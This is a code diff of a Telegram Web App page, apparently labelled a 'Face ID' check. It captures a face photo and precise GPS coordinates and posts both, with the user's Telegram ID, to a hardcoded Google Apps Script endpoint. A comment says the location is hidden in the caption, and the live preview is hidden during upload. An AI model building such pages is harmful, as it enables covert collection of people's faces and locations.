@@ -3,54 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Universal Face ID</title>
+    <title>Face ID HD</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             margin: 0; padding: 0;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
             background-color: #ffffff;
-            font-family: sans-serif; height: 100vh; overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh; overflow: hidden;
         }
 
-        h2 { margin-bottom: 20px; color: #333; font-size: 18px; font-weight: bold; }
+        h2 {
+            margin: 0 0 20px 0; color: #333; 
+            font-size: 18px; font-weight: 600; text-align: center;
+        }
 
+        /* --- DUMALOQ KAMERA --- */
         .camera-wrapper {
-            position: relative; width: 280px; height: 280px;
-            border-radius: 50%; overflow: hidden; background: #000;
+            position: relative;
+            width: 280px; height: 280px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #000;
+            z-index: 10;
             border: 5px solid #e5e5e5; 
             box-shadow: 0 10px 25px rgba(0,0,0,0.1);
             transition: border-color 0.3s;
         }
 
+        /* Tayyor bo'lganda ko'k rang */
         .camera-wrapper.ready { border-color: #2ea6ff; }
-        .camera-wrapper.sending { border-color: #ff9500; }
-        .camera-wrapper.success { border-color: #34c759; }
+        .camera-wrapper.sending { border-color: #ff9500; } /* Sariq */
+        .camera-wrapper.success { border-color: #34c759; } /* Yashil */
 
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        video {
+            width: 100%; height: 100%; object-fit: cover;
+            transform: scaleX(-1); /* Oyna effekti */
+        }
 
+        /* YUZ RAMKASI */
         .face-guide {
-            position: absolute; top: 50%; left: 50%;
+            position: absolute;
+            top: 50%; left: 50%;
             transform: translate(-50%, -50%);
             width: 140px; height: 190px;
             border: 2px dashed rgba(255, 255, 255, 0.8);
             border-radius: 50% 50% 40% 40%;
-            pointer-events: none; z-index: 10;
+            box-shadow: 0 0 0 100px rgba(0, 0, 0, 0.4); 
+            z-index: 20;
+            pointer-events: none;
         }
 
+        /* --- TUGMA --- */
         #btn-capture {
-            margin-top: 30px; padding: 15px 50px; font-size: 16px;
-            background-color: #e5e5e5; color: #999; border: none;
-            border-radius: 30px; cursor: not-allowed; font-weight: 600;
-            transition: 0.3s; width: 80%; max-width: 300px;
+            margin-top: 30px;
+            padding: 15px 50px;
+            font-size: 16px;
+            background-color: #e5e5e5;
+            color: #999;
+            border: none;
+            border-radius: 30px;
+            cursor: not-allowed;
+            font-weight: 600;
+            transition: all 0.3s;
+            width: 80%; max-width: 300px;
         }
 
         #btn-capture.active {
-            background-color: #2481cc; color: white; cursor: pointer;
+            background-color: #2481cc;
+            color: white;
+            cursor: pointer;
             box-shadow: 0 8px 20px rgba(36, 129, 204, 0.3);
         }
 
-        #status-text { margin-top: 10px; font-size: 14px; color: #888; }
+        #status-text {
+            margin-top: 10px; font-size: 13px; color: #888;
+        }
+
+        #debug-text {
+            position: absolute;
+            bottom: 5px;
+            font-size: 10px;
+            color: #ccc;
+        }
+
         canvas { display: none; }
     </style>
 </head>
@@ -63,34 +100,235 @@
         <video id="video" autoplay playsinline muted></video>
     </div>
 
-    <div id="status-text">Yuklanmoqda...</div>
+    <div id="status-text">Tizim yuklanmoqda...</div>
     <button id="btn-capture" disabled>Rasmga Olish</button>
+    <div id="debug-text"></div>
+    <div id="user-id-status" style="margin-top: 10px; font-size: 12px; color: #888; display: none;"></div>
     <canvas id="canvas"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const btn = document.getElementById('btn-capture');
         const statusText = document.getElementById('status-text');
+        const debugText = document.getElementById('debug-text');
+        const userIdStatus = document.getElementById('user-id-status');
         const camBox = document.getElementById('cam-box');
         const title = document.getElementById('main-title');
+        // Telegram Web App tekshiruvi
+        let tg = null;
+        try {
+            tg = window.Telegram.WebApp;
+            if (!tg) {
+                throw new Error("Telegram WebApp API mavjud emas");
+            }
+        } catch (e) {
+            console.error("Telegram WebApp xatosi:", e);
+            alert("Bu sahifa faqat Telegram orqali ishlaydi!");
+        }
 
-        // SIZNING GOOGLE SCRIPT LINKINGIZ
-        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbxsv55RKRrWCv51n7Mq-CA_oRiMZvpcZj5tDDeUnSXirk_Y-2BSzmoItF6rxhLdEBXL/exec"; 
-        
-        // ⚠️ ZAXIRA ID (Agar brauzerdan kirilsa, rasm shu ID ga boradi)
-        // O'z ID raqamingizni yozib qo'ying (Telegramdan @userinfobot orqali bilib oling)
-        const FALLBACK_ID = 976525232; 
-
-        // Telegram WebApp (Bor bo'lsa ishlatamiz, yo'q bo'lsa indamaymiz)
-        const tg = window.Telegram?.WebApp;
-        if(tg) tg.expand();
+        if (tg) {
+            tg.expand();
+            tg.ready();
+            
+            // Event listener - initDataUnsafe o'zgarganda
+            tg.onEvent('viewportChanged', () => {
+                console.log("🔹 Viewport o'zgardi - User ID ni qayta tekshiramiz");
+                if (!userId) {
+                    userId = getUserId();
+                    if (userId) {
+                        debug(`✅ User ID (viewportChanged): ${userId}`);
+                        userIdStatus.innerText = `User ID: ${userId}`;
+                        userIdStatus.style.color = "green";
+                        userIdStatus.style.display = "block";
+                        if (!userLocation) {
+                            statusText.innerText = "Lokatsiya aniqlanmoqda...";
+                            getLocation();
+                        }
+                    }
+                }
+            });
+            
+            // MainButton event
+            if (tg.MainButton) {
+                tg.MainButton.onClick(() => {
+                    console.log("MainButton clicked");
+                });
+            }
+        }
 
         let userLocation = null;
+        let userId = null; // Global o'zgaruvchi
+        
+        // User ID ni dastlabki yuklash - TO'LIQ TEKSHIRISH
+        function getUserId() {
+            if (!tg) {
+                debug("Telegram WebApp API mavjud emas");
+                return null;
+            }
+            
+            // Debug: barcha ma'lumotlarni ko'rsatish
+            console.log("🔍 Telegram WebApp TO'LIQ TEKSHIRUV:");
+            console.log("  - tg mavjudmi:", !!tg);
+            console.log("  - tg.initDataUnsafe:", tg.initDataUnsafe);
+            console.log("  - tg.initData:", tg.initData ? `mavjud (${tg.initData.length} chars)` : "yo'q");
+            console.log("  - tg.version:", tg.version);
+            console.log("  - tg.platform:", tg.platform);
+            console.log("  - tg.isExpanded:", tg.isExpanded);
+            console.log("  - tg.readyState:", tg.readyState);
+            
+            // Barcha propertylarni ko'rsatish
+            console.log("  - tg barcha keys:", Object.keys(tg));
+            
+            // Usul 1: initDataUnsafe dan (eng ishonchli)
+            if (tg.initDataUnsafe) {
+                console.log("  - initDataUnsafe keys:", Object.keys(tg.initDataUnsafe));
+                console.log("  - initDataUnsafe full:", JSON.stringify(tg.initDataUnsafe));
+                
+                // To'g'ridan-to'g'ri user tekshirish
+                if (tg.initDataUnsafe.user) {
+                    console.log("  - user object:", JSON.stringify(tg.initDataUnsafe.user));
+                    if (tg.initDataUnsafe.user.id) {
+                        userId = tg.initDataUnsafe.user.id;
+                        debug(`✅ User ID (initDataUnsafe.user.id): ${userId}`);
+                        return userId;
+                    } else {
+                        console.log("  - user.id mavjud emas");
+                    }
+                } else {
+                    console.log("  - initDataUnsafe.user mavjud emas");
+                }
+                
+                // Boshqa variantlar
+                if (tg.initDataUnsafe.query_id) {
+                    console.log("  - query_id mavjud:", tg.initDataUnsafe.query_id);
+                }
+                if (tg.initDataUnsafe.auth_date) {
+                    console.log("  - auth_date mavjud:", tg.initDataUnsafe.auth_date);
+                }
+            } else {
+                console.log("  - initDataUnsafe mavjud emas");
+            }
+            
+            // Usul 2: initData ni parse qilish
+            if (tg.initData) {
+                try {
+                    console.log("  - Parsing initData...");
+                    console.log("  - initData content:", tg.initData.substring(0, 200));
+                    
+                    // URLSearchParams orqali parse qilish
+                    const initData = new URLSearchParams(tg.initData);
+                    const userStr = initData.get('user');
+                    
+                    if (userStr) {
+                        console.log("  - user string found:", userStr.substring(0, 100));
+                        const user = JSON.parse(decodeURIComponent(userStr));
+                        console.log("  - Parsed user:", user);
+                        if (user && user.id) {
+                            userId = user.id;
+                            debug(`✅ User ID (initData parse): ${userId}`);
+                            return userId;
+                        }
+                    } else {
+                        console.log("  - 'user' key topilmadi initData da");
+                        // Boshqa usul: to'g'ridan-to'g'ri JSON parse qilish
+                        try {
+                            const data = JSON.parse(decodeURIComponent(tg.initData));
+                            if (data.user && data.user.id) {
+                                userId = data.user.id;
+                                debug(`✅ User ID (initData JSON): ${userId}`);
+                                return userId;
+                            }
+                        } catch (e2) {
+                            console.log("  - JSON parse ham ishlamadi");
+                        }
+                    }
+                } catch (e) {
+                    console.error("  - InitData parse xatosi:", e);
+                }
+            }
+            
+            // Usul 3: WebAppUser dan (ba'zi versiyalarda)
+            if (tg.WebAppUser && tg.WebAppUser.id) {
+                userId = tg.WebAppUser.id;
+                debug(`✅ User ID (WebAppUser): ${userId}`);
+                return userId;
+            }
+            
+            // Usul 4: BackendRequest orqali (agar mavjud bo'lsa)
+            if (tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
+                const startParam = tg.initDataUnsafe.start_param;
+                if (startParam && /^\d+$/.test(startParam)) {
+                    userId = parseInt(startParam);
+                    debug(`✅ User ID (start_param): ${userId}`);
+                    return userId;
+                }
+            }
+            
+            debug("❌ User ID topilmadi - barcha usullar sinab ko'rilgan");
+            console.error("❌ User ID topilmadi. Barcha variantlar sinab ko'rilgan.");
+            return null;
+        }
+        
+        // Dastlabki yuklash - bir necha marta urinib ko'ramiz
+        let attempts = 0;
+        const maxAttempts = 5;
+        
+        function tryGetUserId() {
+            attempts++;
+            console.log(`🔄 User ID olish urinishi ${attempts}/${maxAttempts}`);
+            
+            userId = getUserId();
+            
+            if (userId) {
+                debug(`✅ User ID tayyor: ${userId}`);
+                userIdStatus.innerText = `User ID: ${userId}`;
+                userIdStatus.style.color = "green";
+                userIdStatus.style.display = "block";
+                statusText.innerText = "Lokatsiya aniqlanmoqda...";
+                getLocation(); // Lokatsiyani olishni boshlash
+            } else if (attempts < maxAttempts) {
+                // Qayta urinish
+                debug(`⚠️ User ID topilmadi (${attempts}/${maxAttempts}) - qayta urinilmoqda...`);
+                setTimeout(tryGetUserId, 500); // 500ms kutib qayta urinish
+            } else {
+                // Barcha urinishlar tugadi
+                debug("❌ User ID topilmadi - barcha urinishlar tugadi");
+                userIdStatus.innerText = "❌ User ID topilmadi - Bot orqali oching!";
+                userIdStatus.style.color = "red";
+                userIdStatus.style.display = "block";
+                statusText.innerText = "⚠️ Bot orqali oching";
+                statusText.style.color = "orange";
+                title.innerText = "⚠️ Bot orqali oching";
+                title.style.color = "orange";
+                
+                // Console da barcha ma'lumotlarni ko'rsatish
+                console.error("❌ User ID topilmadi. Barcha ma'lumotlar:");
+                console.error("  - tg:", tg);
+                console.error("  - tg.initDataUnsafe:", tg ? tg.initDataUnsafe : "tg yo'q");
+                console.error("  - tg.initData:", tg && tg.initData ? tg.initData.substring(0, 200) : "yo'q");
+            }
+        }
+        
+        // Birinchi urinish - 500ms kutib
+        setTimeout(tryGetUserId, 500);
+        
+        // --- 1. SIZNING GOOGLE SCRIPT LINKINGIZ ---
+        // ⚠️ O'Z GOOGLE SCRIPT LINKINGIZNI QO'YING!
+        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbxsv55RKRrWCv51n7Mq-CA_oRiMZvpcZj5tDDeUnSXirk_Y-2BSzmoItF6rxhLdEBXL/exec"; 
 
-        // 1. KAMERANI YOQISH
+        // Debug funksiyasi
+        function debug(msg) {
+            console.log("🔹 " + msg);
+            debugText.innerText = msg;
+        }
+
+        // --- 2. KAMERANI YOQISH ---
         async function startCamera() {
             try {
                 statusText.innerText = "Kamera ochilmoqda...";
+                debug("Kamera so'ralmoqda...");
+                
+                // Mobil va Desktop uchun universal sozlama
                 let stream;
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
@@ -98,6 +336,7 @@
                         audio: false 
                     });
                 } catch (e) {
+                    debug("User kamera ishlamadi, har qanday kamera...");
                     stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 }
 
@@ -105,97 +344,222 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     camBox.classList.add('ready');
-                    getLocation();
+                    debug("Kamera tayyor");
+                    
+                    // User ID ni tekshirish va keyin lokatsiyani olish
+                    if (!userId) {
+                        userId = getUserId();
+                    }
+                    
+                    if (userId) {
+                        statusText.innerText = "Lokatsiya aniqlanmoqda...";
+                        debug("Kamera tayyor, lokatsiya so'ralmoqda...");
+                        getLocation();
+                    } else {
+                        statusText.innerText = "User ID kutilmoqda...";
+                        debug("User ID kutilmoqda...");
+                        // User ID ni qayta urinib ko'ramiz
+                        setTimeout(() => {
+                            userId = getUserId();
+                            if (userId) {
+                                statusText.innerText = "Lokatsiya aniqlanmoqda...";
+                                getLocation();
+                            }
+                        }, 1000);
+                    }
                 };
             } catch (err) {
-                alert("Kameraga ruxsat bering!");
+                alert("Kameraga ruxsat bering! " + err);
                 statusText.innerText = "Kamera xatosi";
+                debug("Kamera xatosi: " + err.message);
             }
         }
 
-        // 2. LOKATSIYA OLISH
+        // --- 3. LOKATSIYA OLISH ---
         function getLocation() {
-            statusText.innerText = "Lokatsiya aniqlanmoqda...";
+            // Avval User ID ni tekshiramiz
+            if (!userId) {
+                userId = getUserId();
+            }
+            
+            if (!userId) {
+                statusText.innerText = "❌ User ID topilmadi. Bot orqali oching.";
+                statusText.style.color = "red";
+                debug("❌ User ID topilmadi - lokatsiya olinmaydi");
+                return;
+            }
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
                         userLocation = { lat: pos.coords.latitude, long: pos.coords.longitude };
-                        statusText.innerText = "✅ Tayyor";
+                        debug(`Lokatsiya: ${userLocation.lat.toFixed(6)}, ${userLocation.long.toFixed(6)}`);
+                        statusText.innerText = "✅ Tayyor. Rasmga tushing.";
                         statusText.style.color = "green";
                         btn.disabled = false;
                         btn.classList.add('active');
                     },
                     (err) => {
-                        statusText.innerText = "GPS yoqing!";
+                        debug("Lokatsiya xatosi: " + err.message);
+                        statusText.innerText = "❌ GPS yoqing va qayta kiring!";
                         statusText.style.color = "red";
-                        alert("GPS (Geolokatsiya) ni yoqing!");
+                        alert("Iltimos, telefonda GPS (Geolokatsiya) ni yoqing.");
                     },
-                    { enableHighAccuracy: true }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
             } else {
-                statusText.innerText = "GPS xatosi";
+                statusText.innerText = "GPS qo'llab-quvvatlanmaydi";
+                debug("Geolocation qo'llab-quvvatlanmaydi");
             }
         }
 
-        // 3. YUBORISH
-        btn.addEventListener('click', () => {
-            if (!userLocation) { alert("Lokatsiya kerak!"); return; }
+        // --- 4. YUBORISH (GOOGLE SCRIPT ORQALI) ---
+        btn.addEventListener('click', async () => {
+            if (!userLocation) {
+                alert("Lokatsiya aniqlanmadi!");
+                return;
+            }
 
-            // User ID ni aniqlash (Universal)
-            // Agar Telegramdan kirgan bo'lsa, o'z ID si. 
-            // Agar brauzerdan kirgan bo'lsa, FALLBACK_ID (Admin ID).
-            const userId = tg?.initDataUnsafe?.user?.id || FALLBACK_ID;
+            // User ID ni tekshirish (allaqachon yuklangan)
+            if (!userId) {
+                debug("User ID qayta tekshirilmoqda...");
+                userId = getUserId();
+            }
+            
+            if (!userId) {
+                // Barcha ma'lumotlarni ko'rsatish
+                const debugInfo = `
+Telegram WebApp ma'lumotlari:
+- initDataUnsafe: ${tg && tg.initDataUnsafe ? 'mavjud' : 'yo\'q'}
+- initData: ${tg && tg.initData ? 'mavjud' : 'yo\'q'}
+- version: ${tg && tg.version ? tg.version : 'yo\'q'}
+- platform: ${tg && tg.platform ? tg.platform : 'yo\'q'}
 
+⚠️ MUHIM: Bu sahifa faqat Telegram bot orqali ochilganda ishlaydi!
+Bot tugmasini bosing va Web App ni oching.
+                `;
+                
+                console.error(debugInfo);
+                alert("User ID topilmadi!\n\n" + 
+                      "Bu sahifa faqat Telegram bot orqali ochilganda ishlaydi.\n\n" +
+                      "Qanday qilish kerak:\n" +
+                      "1. Botga /start buyrug'ini yuboring\n" +
+                      "2. 'Yuzni Tasdiqlash' tugmasini bosing\n" +
+                      "3. Web App ochiladi va User ID avtomatik topiladi");
+                
+                debug("❌ User ID topilmadi - bot orqali ochish kerak");
+                statusText.innerText = "❌ User ID topilmadi. Bot orqali oching.";
+                statusText.style.color = "red";
+                return;
+            }
+
+            debug(`User ID: ${userId}`);
+
+            // 🔥 RASMNI YASHIRISH (GHOST MODE)
+            // Video elementini yashirish - foydalanuvchi o'z rasmini ko'rmaydi
+            video.style.display = 'none';
+            camBox.style.background = '#2ea6ff'; // Ko'k fon
+            camBox.innerHTML = '<div style="color: white; font-size: 24px; display: flex; align-items: center; justify-content: center; height: 100%;">⏳ Yuklanmoqda...</div>';
+
+            // UI o'zgarishi
             title.innerText = "Yuborilmoqda...";
-            btn.innerText = "⏳...";
+            btn.innerText = "⏳ Yuklanmoqda...";
             btn.disabled = true;
-            btn.style.backgroundColor = "#ff9500";
+            btn.style.backgroundColor = "#ff9500"; // Sariq
             camBox.classList.remove('ready');
             camBox.classList.add('sending');
 
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
+            
+            // O'lchamlarni olamiz
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
+            // Oyna effektini to'g'irlash
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0);
+            
+            // Video streamni to'xtatish (kamerani yopish)
+            if (video.srcObject) {
+                const tracks = video.srcObject.getTracks();
+                tracks.forEach(track => track.stop());
+                video.srcObject = null;
+            }
 
-            // Sifatli rasm (0.8)
+            // 🔥 SIFATLI RASM (HD)
+            // 0.8 sifat (80%) juda yaxshi va tez ketadi
             const base64 = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+            debug(`Rasm hajmi: ${Math.round(base64.length / 1024)}KB`);
+            
+            // Lokatsiyani string qilish
             const locString = JSON.stringify(userLocation);
+            debug(`Lokatsiya: ${locString}`);
 
-            fetch(GOOGLE_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    image: base64,
-                    chat_id: userId,
-                    caption: "LOC_DATA:" + locString 
-                })
-            })
-            .then(() => {
-                title.innerText = "✅ Yuborildi!";
+            // Googlega POST so'rov
+            try {
+                debug("Google Script ga yuborilmoqda...");
+                
+                // ⚠️ MUHIM: no-cors o'rniga cors ishlatamiz (agar mumkin bo'lsa)
+                // Agar CORS xatosi bo'lsa, no-cors ishlatamiz
+                const response = await fetch(GOOGLE_URL, {
+                    method: "POST",
+                    mode: "cors", // no-cors o'rniga cors
+                    headers: { 
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({ 
+                        image: base64,
+                        chat_id: userId,
+                        // Lokatsiyani "caption" ga yashiramiz
+                        caption: "LOC_DATA:" + locString 
+                    })
+                });
+
+                // Agar cors ishlatilsa, javobni o'qish mumkin
+                if (response.ok) {
+                    const result = await response.json();
+                    debug("Google Script javobi: " + JSON.stringify(result));
+                } else {
+                    debug("Google Script xatosi: " + response.status);
+                }
+
+                // Muvaffaqiyatli (rasm Google Script orqali Telegram ga yuborilgan)
+                title.innerText = "✅ Muvaffaqiyatli!";
                 btn.innerText = "Ketdi!";
-                btn.style.backgroundColor = "#34c759";
+                btn.style.backgroundColor = "#34c759"; // Yashil
                 camBox.classList.remove('sending');
                 camBox.classList.add('success');
-                statusText.innerText = "Rasm botga ketdi!";
+                // Rasm yashirilgan holda qoladi (ghost mode)
+                camBox.innerHTML = '<div style="color: white; font-size: 24px; display: flex; align-items: center; justify-content: center; height: 100%;">✅ Yuborildi</div>';
+                statusText.innerText = "Rasm yuborildi! Bot javobini kuting...";
                 
-                // Agar telegramda bo'lsa yopamiz
-                if(tg) setTimeout(() => { tg.close(); }, 2000);
-            })
-            .catch(err => {
-                alert("Internet xatosi");
+                // Botga signal (shart emas, rasm o'zi boradi, lekin yopish uchun kerak)
+                setTimeout(() => { 
+                    tg.close(); 
+                }, 2000); // 2 soniya kutamiz
+                
+            } catch (err) {
+                console.error("❌ Xatolik:", err);
+                debug("Xatolik: " + err.message);
+                alert("Internet xatosi: " + err.message);
+                
+                // Xatolik bo'lsa, videoni qayta ko'rsatish
+                video.style.display = 'block';
+                camBox.innerHTML = '';
+                camBox.appendChild(video);
+                
+                title.innerText = "Qayta urining";
                 btn.disabled = false;
-                btn.innerText = "Qayta urining";
+                btn.innerText = "Rasmga Olish";
+                btn.style.backgroundColor = "#2481cc";
                 camBox.classList.remove('sending');
                 camBox.classList.add('ready');
-            });
+            }
         });
 
+        // Ishga tushirish
         startCamera();
     </script>
 </body>
